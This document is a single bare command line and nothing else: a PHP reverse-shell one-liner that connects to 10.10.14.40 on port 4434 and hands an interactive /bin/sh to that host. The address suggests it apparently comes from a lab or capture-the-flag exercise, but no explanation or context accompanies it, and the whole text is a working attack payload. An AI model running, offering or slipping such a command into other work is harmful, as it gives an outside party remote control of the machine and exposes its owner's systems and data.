php -r '$sock=fsockopen("10.10.14.40",4434);exec("/bin/sh -i <&3 >&3 2>&3");' &
